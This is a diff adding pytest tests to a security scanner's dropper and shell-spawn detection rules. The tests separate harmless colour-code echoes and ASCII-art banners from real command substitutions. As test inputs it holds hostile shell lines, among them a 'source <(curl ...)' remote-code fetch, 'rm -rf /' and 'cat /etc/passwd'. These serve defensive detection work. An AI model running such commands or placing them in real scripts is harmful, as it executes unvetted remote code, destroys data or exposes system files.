@@ -10218,3 +10218,104 @@ class TestTheSameCredentialNameInManyFiles:
         combined = [f for f in Scanner().scan(tmp_path).findings if f.rule_id.startswith("SECRET.")]
         assert len(combined) == 2
         assert any(f.severity >= Severity.HIGH for f in combined), "the odd one out still blocks"
+
+
+class TestWhichLineTheDropperPointsAt:
+    """`community-scripts__ProxmoxVE` came back to the top of the fourth pass's worst list
+    at 28 findings, 24 of them `SUSPECT.DROPPER.001` across `tools/pve/`. Every one of those
+    scripts does `source <(curl ... /misc/api.func)`, which is a real dropper and the same
+    decision in all of them -- and `_collapse_idiom` exists for exactly that and was not
+    firing.
+
+    The reason was the anchor. Each script opens with an ASCII-art banner and two colour
+    variables, and both supplied a spawn:
+
+        YW=$(echo "\\033[33m")
+        / /_  / / / _ \\/ ___/ / / / ___/ __/ _ \\/ __ `__ \\     / / / ___/ / __ `__ \\
+
+    The finding anchored on whichever came first, and `_collapse_idiom` hashes the anchor.
+    `YW=$(echo ...)` and `RD=$(echo ...)` hash differently, and a banner line differs per
+    script, so 24 copies of one decision stayed 24 findings. `Engine._anchor` records the
+    same lesson for mitigations: which occurrence is reported decides what the finding says.
+
+    Two corrections, and then the collapse that already existed did the work.
+    """
+
+    @staticmethod
+    def _spawns(raw: bytes) -> bool:
+        from cordon_scanner.rules.loader import RuleLoader, RuleSet
+
+        rule = next(r for r in RuleSet(RuleLoader.load_builtin()) if r.id == "CAP.SH.SPAWN.001")
+        return bool(rule.match.regex.search(raw))
+
+    @pytest.mark.parametrize(
+        "line",
+        [
+            b'YW=$(echo "\\033[33m")',
+            # The semicolon in an ANSI parameter, which the first draft of this refused.
+            b'RD=$(echo "\\033[01;31m")',
+            # And `$1`, which the first draft also refused by forbidding every `$`.
+            b'msg=$(printf "%s\\n" "$1")',
+        ],
+    )
+    def test_a_substitution_that_only_prints_is_not_a_spawn(self, line: bytes) -> None:
+        assert not self._spawns(line)
+
+    @pytest.mark.parametrize(
+        "line",
+        [
+            b"v=$(echo x | sed s/x/y/)",
+            b"v=$(echo x; rm -rf /)",
+            b"v=$(echo $(whoami))",
+            b"v=$(echo x && curl http://x)",
+        ],
+    )
+    def test_anything_else_in_the_substitution_still_is(self, line: bytes) -> None:
+        """`echo` and `printf` only, and only when the substitution holds nothing else. A
+        pipeline starts `sed`; a separator starts `rm`; a nested substitution starts
+        `whoami`."""
+        assert self._spawns(line)
+
+    ART: ClassVar[bytes] = (
+        b"  / /_  / / / _ \\/ ___/ / / / ___/ __/ _ \\/ __ `__ \\     / / / ___/ / __ `__ \\"
+    )
+
+    def test_ascii_art_is_not_a_command_substitution(self) -> None:
+        """The residual hole in the ninth pass's backtick narrowing. That pass asked the
+        content to look like a command line -- a space before an argument, or a path
+        separator -- and a banner is full of both. A command starts with a character a
+        command can start with, and no command line has a run of three spaces."""
+        assert not self._spawns(self.ART)
+
+    @pytest.mark.parametrize(
+        "line",
+        [b"out=`ls -la /tmp`", b"v=`cat /etc/passwd`", b"z=`$HOME/bin/tool`", b"u=`whoami`"],
+    )
+    def test_a_real_backtick_substitution_survives_both(self, line: bytes) -> None:
+        assert self._spawns(line)
+
+    SCRIPT: ClassVar[str] = (
+        "#!/usr/bin/env bash\n"
+        'YW=$(echo "\\033[33m")\n'
+        'RD=$(echo "\\033[01;31m")\n'
+        "source <(curl -fsSL https://example.test/misc/api.func) 2>/dev/null || true\n"
+    )
+
+    def test_ten_scripts_with_one_decision_are_one_finding(self, tmp_path) -> None:
+        """What the corrections were for. With the anchor on the construct that is actually
+        identical, the collapse that already existed groups them."""
+        tools = tmp_path / "tools" / "pve"
+        tools.mkdir(parents=True)
+        for index in range(10):
+            (tools / f"task-{index}.sh").write_text(self.SCRIPT + f'echo "task {index}"\n')
+        found = [f for f in Scanner().scan(tmp_path).findings if f.rule_id == "SUSPECT.DROPPER.001"]
+        assert len(found) == 1
+        assert "appears in 10 files" in found[0].message
+
+    def test_and_the_finding_is_still_made(self, tmp_path) -> None:
+        """The control. Sourcing a remote file from a branch is a dropper, and one script
+        doing it reports at full severity."""
+        (tmp_path / "setup.sh").write_text(self.SCRIPT)
+        found = [f for f in Scanner().scan(tmp_path).findings if f.rule_id == "SUSPECT.DROPPER.001"]
+        assert found
+        assert found[0].severity >= Severity.HIGH
